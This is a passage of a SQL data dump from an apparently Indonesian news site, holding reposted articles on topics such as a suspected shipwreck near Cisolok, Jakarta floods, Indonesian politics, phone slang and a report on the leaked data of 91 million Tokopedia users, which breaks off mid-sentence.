(642, 39, 'admin', 'Ini Link Google Maps untuk Melihat Benda Diduga Kapal Karam di Cisolok', '', 'https://www.youtube.com/watch?v=E3T4j7yFt-E', 'ini-link-google-maps-untuk-melihat-benda-diduga-kapal-karam-di-cisolok', 'Y', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Sebuah unggahan tangkapan layar (screenshot) citra satelit Google Maps viral di media sosial. Tangkapan layar itu berisi foto-foto benda mirip kapal yang karam.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Benda yang diduga sebagai kapal karam itu berlokasi tak jauh dari Pantai Cikembang, Kecamatan Cisolok,&nbsp; Sukabumi, Jawa Barat. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut keterangan saksi, foto tersebut pertama kali ditemukan oleh tiga orang nelayan bernama Akbar, Iki, dan Asep, yang hendak memancing di laut selatan Sukabumi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Awalnya, ketiga nelayan tersebut sedang menggunakan aplikasi Google Maps untuk mencari lokasi memancing yang strategis. Namun, tak disangka-sangka, mereka justru menemukan sosok benda mirip kapal yang terlihat karam di tengah laut.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Awalnya Iki tidak sengaja lihat benda yang aneh di Google Maps, lalu menanyakan ke saya, dan saya juga penasaran,\" kata Akbar Alfiana (22) kepada Kompas.com, Sabtu (20/6/2020). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Foto tersebut kemudian disebar di grup Facebook oleh Iki pada Jumat (19/6/2020) sekitar pukul 23.00 WIB dengan harapan mendapat jawaban dari warganet. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Setelah foto itu viral di media sosial, petugas gabungan yang beranggotakan TNI, Polri, dan tim SAR langsung melakukan penelusuran ke lokasi penampakan kapal karam tersebut.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> \"Penelusuran ini untuk memastikan keberadaan kapal karam yang tertangkap kamera satelit Google Maps itu. Namun, untuk memastikannya, kami terkendala peralatan deteksi bawah laut,\" kata Kepala Satuan Polair Polres Sukabumi AKP Tri Andri Apandi, di Sukabumi, Minggu (21/6/2020). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Petugas pun mengerahkan kapal patroli yang bertolak dari Dermaga I Pelabuhan Perikanan Nusantara Palabuhanratu menuju titik koordinat kapal yang berada di 6.97\'2601\" Bujur Timur-106.42\'7192\" Lintang Selatan, tepatnya di Pantai Cikembang, Kecamatan Cisolok.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sesampainya di lokasi, petugas mengamati secara manual untuk memastikan koordinasi dan dengan hati-hati memantau situasi arus permukaan. Petugas kemudian berhasil mengidentifikasi kapal berjenis kargo tersebut.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Diperkirakan kapal itu memiliki panjang sekitar 150 meter dengan lebar 28 hingga 30 meter dan berbobot mati 120.000 ton. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Penampakan benda mirip kapal karam itu terlihat jelas pada Google Maps, dan dapat diakses melalui tautan <a href=\"https://www.google.com/maps/place/6%C2%B058\'21.0%22S+106%C2%B025\'36.0%22E/@-6.9725,106.4244783,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0x0!8m2!3d-6.9725!4d106.426667\" target=\"_blank\">link atau berikut ini</a>. Foto kapal akan terlihat saat mengubah tampilan ke citra Satelit.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Ini Link Google Maps untuk Melihat Benda Diduga Kapal Karam di Kota Cisolok', 'Minggu', '2020-07-07', '13:17:57', 'mstore_blog_stelit.jpg', 9, 'palestina', 'Y'),
(643, 42, 'admin', 'Fatima Nabil, Presenter TV Berjilbab Pertama di Mesir', '', '', 'fatima-nabil-presenter-tv-berjilbab-pertama-di-mesir', 'N', 'N', 'N', '<p>Kairo - Fatima Nabil mencatat sejarah. Ia menjadi presenter pertama yang berjilbab yang muncul di televisi milik pemerintah Mesir. Dalam balutan jilbab berwarna krem, dan jas hitam Fatima membacakan buletin berita siang, Minggu 2 September 2012.&nbsp;</p>\r\n\r\n<p>&quot;Akhirnya revolusi juga terjadi di televisi milik pemerintah,&quot; kata Nabil. Ia berharap kemunculannya ini diikuti tak hanya presenter berita tapi juga presenter cuaca dan lainnya.</p>\r\n\r\n<p>&quot;Saat ini, standar bukan tergantung pada jilbab, yang sebenarnya merupakan pilihan pribadi setiap perempuan. Tapi lebih pada profesionalitas dan intelektual,&quot; ujarnya.</p>\r\n\r\n<p>Sejak televisi pemerintah ini berdiri tahun 1960, dibawah rejim Presiden Hosni Mubarok, perempuan yang mengenakan jilbab dilarang menjadi presenter. Aturan ini sempat ditentang sejumlah aktivis hak asasi dan kelompok liberal, namun kandas.</p>\r\n\r\n<p>Pemerintah baru yang dipimpin Presiden Mohammed Mursi, mencabut aturan ini. Menteri Informasi Baru Saleh Abdel-Makshoud mengatakan sudah banyak perempuan berjilbab yang muncul sebagai presenter di channel-channel televisi Arab dan internasional. Jadi perubahan ini tak menjadi masalah apalagi saat ini hampir 70% perempuan Mesir mengenakan jilbab.</p>\r\n\r\n<p>Petinggi stasiun televisi tersebut mengatakan munculnya Nabila bisa membangkitkan semangat perempuan lain yang ingin tetap mempertahankan jilbab mereka tanpa harus takut kehilangan pekerjaan. (Sumber: Tempo.co)</p>\r\n', 'Fatima Nabil', 'Minggu', '2018-04-22', '11:10:10', 'fatima_nabil.jpg', 11, 'internasional', 'Y'),
(650, 22, 'admin', 'Roy Suryo Menpora, SBY Dipertanyakan', '', '', 'roy-suryo-menpora-sby-dipertanyakan', 'Y', 'N', 'N', '<p>Pengamat politik dari Charta Politika, Yunarto Wijaya mempertanyakan dasar keputusan SBY menunjuk Roy Suryo sebagai Menpora. Apalagi, kata Yunarto, ada pernyataan SBY yang menegaskan Roy cakap untuk mengemban tugas sebagai Menpora.</p>\r\n\r\n<p>Menurut Yunarto, Roy selama ini lebih dikenal sebagai pakar foto digital dan video serta dosen di sebuah perguruan tinggi negeri. &quot;Namun, belum terdengar kiprahnya di bidang kepemudaan dan olahraga,&quot; kata Yunarto. Sementara, tugas Menpora yang berat dan masa tugasnya relatif singkat idealnya mengutamakan figur yang kompetensinya teruji di bidang kepemudaan dan olahraga.</p>\r\n\r\n<p>Karena itu, Yunarto menduga penunjukan Roy bukan karena kompetensi, melainkan representasi politik. &quot;Ditunjuknya kader Partai Demokrat Roy Suryo sebagai Menpora menunjukkan faktor politisnya sangat kuat,&quot; katanya. (sumber: republika.co.id)</p>\r\n', 'Roy Suryo saat dilantik jadi Menpora', 'Minggu', '2018-04-22', '07:14:42', 'roy_suryo.jpg', 11, '', 'Y'),
(651, 21, 'admin', 'Banjir Jakarta, Kerugian Ekonomi Capai Rp 1 Triliun', 'Jakarta Darurat Banjir', 'http://www.youtube.com/embed/RQMbr4DBqXk', 'banjir-jakarta-kerugian-ekonomi-capai-rp-1-triliun', 'N', 'N', 'Y', '<p>Ketua Asosiasi Pengusaha Indonesia Sofjan Wanandi mengatakan, banjir yang melanda Jakarta sepekan ini telah menimbulkan kerugian ekonomi yang cukup tinggi. Biaya bencana yang ditanggung untuk sekadar menyediakan makan&nbsp; bagi para pengungsi pun mencapai Rp 1 miliar lebih.</p>\r\n\r\n<p>Hal itu disampaikan Sofjan, saat ditemui di area bencana banjir di Penjaringan, Jakarta Utara, Minggu (20/1/2013).</p>\r\n\r\n<p>Sofjan menegaskan, tak bergeraknya roda ekonomi di Jakarta akibat bencana banjir menyebabkan kerugian lebih dari Rp 1 triliun. Aktivitas perdagangan menjadi tidak berjalan, dan kawasan Industri Pulogadung juga ikut lumpuh karena tak memperoleh suplai listrik akibat gardu listrik terendam banjir.</p>\r\n\r\n<p>Negara importir pun, katanya, mulai mempertanyakan kapan Jakarta bisa pulih, karena ini sangat terkait dengan kegiatan ekspor komoditas keluar negeri dari seluruh daerah di Indonesia yang bertumpu di Jakarta.</p>\r\n\r\n<p>&rdquo;Importir itu mulai bertanya-tanya, kapan banjir di Jakarta bisa surut. Kendati mereka saat ini memahami Jakarta sedang dilanda bencana,&rdquo; kata Sofjan. (sumber: kompas.com)</p>\r\n', 'Banjir di daerah Pluit', 'Minggu', '2018-04-22', '07:57:25', 'prediksi-banjir-jakarta.jpg', 21, '', 'Y'),
(652, 22, 'admin', 'Hary Tanoe Mundur dari Partai Nasdem', '', '', 'hary-tanoe-mundur-dari-partai-nasdem', 'N', 'Y', 'N', '<p>\r\nKetua Dewan Pakar DPP Partai Nasional Demokrat (Nasdem) Hary Tanoesoedibjo menyatakan mundur dari keanggotaan Partai Nasdem. Hal itu disampaikannya secara resmi dalam jumpa pers, Senin (21/1/2013), di Jakarta.\r\n</p>\r\n<p>\r\n&quot;Saya menyatakan mundur dalam kapasitas saya sebagai Ketua Dewan Pakar. Mulai hari ini, saya bukan lagi anggota dari Partai Nasdem. Keputusan ini saya lakukan dengan berat hati,&quot; kata Hary.\r\n</p>\r\n<p>\r\nIa menyatakan, sejak bergabung dengan Partai Nasdem pada 9 Oktober 2011, Hary merasa telah melakukan upaya terbaik, baik energi, pikiran, dana, maupun risiko, untuk berpartisipasi membesarkan Partai Nasdem. &quot;Target utamanya lolos verifikasi dan lolos sebagai partai peserta pemilu. Saya merupakan bagian yang ikut meloloskan Nasdem,&quot; kata bos MNC Grup ini.\r\n</p>\r\n<p>\r\n&quot;Keputusan saya ini tidak mengenakkan, tapi pada satu titik saya harus memutuskan ini. Aktivitas politik harus tetap dijalankan. Destiny keterlibatan saya di politik adalah menjadi bagian dari perubahan untuk bangsa Indonesia menjadi lebih baik. Saya ingin ikut andil secara nyata, langsung. Karena bagaimanapun politik menjadi satu bagian ideologi dan bagian dari masa depan kita,&quot; papar Hary.\r\n</p>\r\n<p>\r\nPerpecahan di tubuh Nasdem mulai merebak ketika beredar kabar adanya faksi di dalam partai itu. Dikabarkan, Surya Paloh yang akan menjadi ketua umum partai itu berseberangan dengan faksi Hary Tanoe. Beberapa waktu lalu, kelompok Surya Paloh memecat Sekjen Garda Pemuda Nasional Demokrat (GPND), Saiful Haq.\r\n</p>\r\n<p>\r\nTentang alasannya mundur, Hary mengatakan karena ada perbedaan pendapat dengan Ketua Majelis Tinggi Partai Nasdem Surya Paloh (sumber: kompas.com) \r\n</p>\r\n', 'Hary Tanoe saat memberikan keterangan pers', 'Jumat', '2013-01-25', '00:58:26', '', 20, 'politik', 'Y'),
(653, 41, 'admin', 'Ketika kata Ciyus Terucap dari Mulut Jokowi', '', '', 'ketika-kata-ciyus-terucap-dari-mulut-jokowi', 'N', 'Y', 'N', '<p>Kata <em>ciyus</em> atau serius sering terdengar diucapkan anak-anak zaman sekarang yang sering dijuluki anak baru gede (ABG). Nah, ketika bahasa gaul itu diucapkan oleh Joko Widodo, para pewarta yang bertugas meliput kegiatan Gubernur DKI Jakarta itu tak bisa menahan tawa karena nadanya yang sedikit medok.</p>\r\n\r\n<p>Terhitung sudah dua kali Jokowi melontarkan kata itu kepada wartawan. Pertama, saat Jumat (18/1/2013) malam lalu, ketika Jokowi meninjau perbaikan Tanggul Kanal Banjir Barat (KBB) di Latuharhary, Jakarta Pusat. Seharian raut muka Jokowi begitu serius dan tegang karena pengerjaan tanggul yang masih belum selesai, ditambah hujan deras yang terus mengguyur Ibu Kota. Pendek kata, Jokowi tampak sangat suntuk dan senyum khasnya pun tak terpancar dari dirinya.</p>\r\n\r\n<p>Saat itu, Jokowi menghampiri wartawan yang sudah menunggunya di luar rel kereta api yang terputus. Lantas para wartawan berniat mencairkan suasana dengan melontarkan pertanyaan-pertanyaan konyol kepada Jokowi, seperti &quot;Apabila tanggul selesai, ditandai oleh pemotongan pita di Sency (Senayan City)?&quot;. Mendengar pertanyaan itu, senyum yang hilang dari Jokowi akhirnya muncul kembali.</p>\r\n\r\n<p>Seraya mengernyitkan dahinya, Jokowi bertanya, &quot;Apa itu Sency?&quot; Wartawan pun langsung menjelaskan kalau Sency itu adalah kependekan dari Senayan City. Mengetahui hal tersebut, Jokowi pun tertawa dan mengatakan kalau berbicara hendaknya jangan disingkat-singkat. &quot;Oh, <em>kirain </em>saya sensitif itu maksudnya. <em>Mbok</em>, jangan disingkat-singkat, <em>tho</em>,&quot; kata Jokowi.</p>\r\n\r\n<p>Pembicaraan itu pula yang membuat Jokowi melontarkan kata <em>ciyus</em> dan <em>miapah</em> kepada wartawan. &quot;Kalau <em>ciyus miapah </em>itu apa? Ha-ha-ha,&quot; kata Jokowi yang membuat suasana lokasi tersebut yang awalnya tegang menjadi ramai.</p>\r\n\r\n<p>Kata <em>ciyus </em>kembali diucapkan Jokowi, Selasa (22/1/2013) kemarin, saat berbincang dengan wartawan di Balaikota DKI. Bahasa gaul itu keluar kembali setelah ia ditanya terkait kinerjanya 100 hari.</p>\r\n\r\n<p>Saat itu, Jokowi ditanya masalah Jakarta apa yang membuat Jokowi pusing. Jokowi pun menjawab tak ada persoalan yang membuatnya pusing karena ia telah menghadapi masalah itu sejak ia memimpin Solo selama delapan tahun. Namun, ada satu masa Jokowi mengaku tidak memiliki semangat. &quot;Yaitu kalau pas B sama pas T. Apa itu? Pokoknya pas B sama pas T. <em>Ciyuss</em>,&quot; canda Jokowi yang mengundang tawa para wartawan. (sumber: kompas.com)</p>\r\n', '', 'Minggu', '2018-04-22', '07:36:47', 'jokowi_ciyus.jpg', 5, 'metropolitan', 'Y'),
(654, 31, 'admin', 'Bahaya Mendiagnosis Penyakit di Internet', '', '', 'bahaya-mendiagnosis-penyakit-di-internet', 'N', 'Y', 'N', '<p>Apakah Anda mengunjungi &quot;dokter Google&quot; lebih sering dari dokter di klinik? Anda tidak sendiri. Dalam sebuah survei tahun lalu di Amerika diketahui bahwa 35 persen responden mencocokkan gejala penyakitnya di internet dan mendiagnosis dirinya sendiri.</p>\r\n\r\n<p>Masih menurut survei yang dilakukan The Pew Research Center&#39;s Internet &amp; American Life Project itu, sekitar 41 responden mengatakan diagnosis sendiri itu ternyata dikonfirmasi kebenarannya oleh dokter.</p>\r\n\r\n<p>Tetapi, sekitar satu dari tiga responden mengaku tidak pernah pergi ke dokter untuk mencari opini kedua. Malahan, 18 persen responden mengatakan bahwa upaya mendiagnosis sendiri itu ternyata salah ketika ditanyakan ke dokter.</p>\r\n\r\n<p>Meski survei yang melibatkan 3.000 responden itu sebenarnya dilakukan untuk mengetahui siapa yang mencari informasi kesehatan secara <em>online</em>, tetapi para profesional medis merasa khawatir dengan tren itu.</p>\r\n\r\n<p>&quot;Rata-rata tiap orang mengunjungi empat situs lalu memutuskan ia menderita kanker dan akan segera meninggal. Padahal, di internet banyak informasi yang keliru,&quot; kata Rahul K Khare, dokter unit gawat darurat dari Northwestern Memorial Hospital.</p>\r\n\r\n<p>Menurut Khare, ia sering menemukan pasien yang hidupnya menjadi penuh kecemasan karena mereka merasa menderita penyakit berat setelah mencocokkan gejala yang dirasakannya dengan informasi di internet. (sumber: kompas.com)</p>\r\n', '', 'Minggu', '2018-04-22', '07:29:21', 'Diagnosis-Penyakit.jpg', 8, 'kesehatan', 'Y'),
(655, 19, 'admin', 'Istilah HP Kentang untuk Ejek Ponsel Pas-pasan, dari Mana Asal-usulnya?', '', 'https://www.youtube.com/watch?v=bhh5hPMef64', 'istilah-hp-kentang-untuk-ejek-ponsel-paspasan-dari-mana-asalusulnya', 'N', 'Y', 'Y', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Istilah \"hape (HP) kentang\" saat ini banyak digunakan, baik di dunia maya maupun nyata. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Istilah tersebut kerap dipakai untuk mengolok-olok ponsel yang memiliki spesifikasi rendah dan \"melempem\" saat digunakan untuk main game. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, dari mana istilah ini muncul? Istilah \"kentang\" sendiri bukanlah sebuah ungkapan baru. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kentang sendiri merupakan kependekan dari ungkapan \"kena tanggung\", atau segala sesuatu yang serba hampir dan kurang maksimal. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebenarnya, istilah \"kentang\" juga populer digunakan remaja di Amerika Serikat (AS). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut situs Urban Dictionary, kentang (potato) merupakan bahasa slang untuk mengolok-olok sesuatu yang dianggap buruk, bodoh, membosankan, atau tidak menarik. Misalnya, menyebut suatu acara yang membosankan atau mengolok-olok benda yang dinilai jelek.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Salah satu pengguna di forum diskusi Quora juga membagikan pendapatnya, bahwa bisa jadi istilah kentang diambil dari kata Fanshu yang berarti ubi dalam bahasa Kanton. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Biasanya, kata itu digunakan untuk makian kepada seseorang yang kurang pandai dengan berkata \"dafanshu\" yang secara harfiah berarti kentang besar. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Arti tersebut agak mirip dengan slang potato-head di Amerika yang juga kerap digunakan untuk mekian yang sama. Definisi ini agak sedikit mirip dengan arti \"kentang\" di Indonesia. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Umumnya, ungkapan ini ditujukan untuk menyebut sesuatu yang nilainya lebih rendah atau kurang maksimal. Tak terkecuali soal gadget.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\" Hape kentang adalah ponsel dengan spesifikasi pas-pasan. Terbatas banget kemampuannya,\" jelas pengamat gadget, Herry SW. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pas-pasan yang dimaksud bisa dilihat dari spesifikasi yang terbilang lebih rendah daripada kebanyakan ponsel kelas di atasnya. Herry mencontohkan, Hape kentang biasanya memiliki ruang penyimpanan kecil, misalnya RAM 2 GB dan ROM 16 GB. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Prosesor yang digunakan juga biasanya kelas bawah dan baterainya kurang dari 4.000 mAh. Pendapat senada juga diuraikan pengamat gadget, Lucky Sebastian. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Lucky mengatakan \"HP kentang\" biasanya masuk dalam kategory entry level. Ponsel dalam kategori ini biasanya kurang maksimal apabila digunakan untuk bermain game berat seperti PUBG, Asphalt 9, CoDM, dll. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Ketika digunakan untuk bermain game yang berat sering tidak mampu atau lag parah, karena tidak didesain untuk itu,\" paparnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, YouTuber SobatHape, Irwan Kusuma, mengatakan definisi \"HP kentang\" sangat subjektif. Menurut Irwan, kentang bisa berarti spesifikasinya \"nanggung\" atau \"nggantung\".</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Berbeda dengan Lucky atau Herry, menurut Irwan, \"HP kentang\" tidak selalu masuk entry-level. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Istilah ini juga bisa dialamatkan untuk ponsel flagship yang punya spesifikasi tanggung. Misalnya, ada dua ponsel flagship yang berada di kelas yang sama dan dijual dengan harga yang mirip. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, salah satunya memiliki NFC atau in display fingerprint atau fitur lain yang mutakhir. Tapi fitur itu, tidak dimiliki ponsel satunya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Atau bisa juga hapenya yang harganya \'nanggung\'. Karena dengan menambah sedikit budget, bisa dapet spesifikasi yang lebih baik,\" pungkas Irwan.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Istilah HP Kentang untuk Ejek Ponsel Pas-pasan, dari Mana Asal-usulnya, yuk cari tau!', 'Sabtu', '2020-07-07', '13:55:12', 'hp_kentang_mstore_indonesia.jpg', 16, 'teknologi', 'Y'),
(656, 39, 'admin', 'Bocoran Data 91 Juta Pengguna Tokopedia Beredar lewat Link di Facebook', '', 'https://www.youtube.com/watch?v=Ay8ByeoZUpA', 'bocoran-data-91-juta-pengguna-tokopedia-beredar-lewat-link-di-facebook', 'Y', 'Y', 'Y', '<p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Kasus kebocoran pengguna e-commerce Tokopedia sempat membuat heboh pada Mei lalu. Seorang anggota forum peretas Raidforums.com&nbsp;mengaku memiliki data 91 juta pengguna e-commerce tersebut dan menjualnya. </span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Belakangan, pada akhir pekan ini, Lembaga Riset Siber Indonesia CISSRec (Communication and Information System Security Research Center) menemukan bahwa ada orang yang membeli data tersebut dan mengedarkan tautan unduhannya melalui Facebook.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Chairman CISSReC Pratama Persadha mengatakan link tersebut di-posting pada Sabtu (4/7/2020) kemarin, oleh salah satu anggota grup terkait keamanan siber di Facebook yang memiliki hampir 15.000 anggota. </span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tautan tersebut bersumber dari anggota situs Raidforums bernama @Cellibis yang sudah lebih dulu menyebarkan&nbsp;link&nbsp;di situs tersebut pada Jumat (3/7/2020), atau sehari sebelum tautan diunggah ke Facebook.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> \"Akun tersebut membagikan secara hampir cuma-cuma di Raidforums yang sebelumnya dia dapatkan dari cara membeli data tersebut di darkweb sebesar 5.000 US Dollar (Rp 72,6 juta),\" ujar Pratama dalam keterangan tertulis yang dilayangkan ke KompasTekno.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Data 91 juta pengguna, dari nama lengkap, e-mail, hingga nomor ponsel Pratama mengungkapkan bahwa seseorang yang ingin mengunduh file bocoran data pengguna Tokopedia tersebut harus menggunakan VPN lantaran file itu disimpan oleh server yang berbasis di Amerika Serikat (AS).</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Raidforums juga menerapkan sistem pembayaran berbasis credits untuk link download. Member bisa melakukan deposit uang via Paypal, minimal sebesar 8 euro (Rp 130.000), untuk mendapatkan 30 credits. Link bocoran data pengguna Tokopedia dibanderol 8 credits. </span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Apabila pembayaran sudah dilakukan, maka link hosting dari pihak ketiga akan muncul dan siap diunduh. hasil unduhan berbentuk format zip dengan ukuran data sebesar 9,5 GB. Setelah itu, unduhan tersebut harus diekstrak dengan hasil file akhir berbentuk .txt sebesar 28,5 GB.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Namun, file teks berukuran besar itu tidak bisa langsung dibuka, melainkan harus dengan aplikasi khusus seperti Ultraedit.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Setelah itu kita bisa melihat data sebanyak 91.174.216 (pengguna) yang berisikan nama lengkap, nama akun, e-mail, toko online, tanggal lahir, nomor ponsel, tanggal mendaftar, serta beberapa data yang terenkripsi berbentuk hash,\" ujar Pratama.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pemilik file kemudian bisa dengan mudah mencari informasi pengguna Tokopedia, entah nomor ponsel, e-mail, atau lainnya, dengan fitur search.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut Pratama, data yang dibocorkan lewat link ini sama dengan bocoran pada awal Mei 2020 lalu, yaitu data yang diambil per bulan Maret 2020 dari Tokopedia.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Hingga hari Minggu (5/7/2020) pukul 10.00 WIB, tautan untuk mengunduh data 91 juta akun Tokopedia masih bisa diakses dan sudah diunduh oleh setidaknya 58 orang. Pada tautan tersebut tertulis link akan kadaluarsa sampai 5 hari kedepan.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, ketika dikonfirmasi oleh KompasTekno, Pratama mengatakan bahwa link terkait sudah dihapus pada Minggu sore tadi, baik di situs Raidforums maupun grup Facebook tempat tautan disebarkan.</span></p><p style=\"margin-right: 0px; margin-bottom: 10px; margin-left: 0px; color: rgb(51, 51, 51); font-family: \" helvetica=\"\" neue\",=\"\" helvetica,=\"\" arial,=\"\" sans-serif;=\"\" font-size:=\"\" 14px;\"=\"\"><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> \"Link yang dijanjikan akan dihapus 5 hari lagi, ternyata 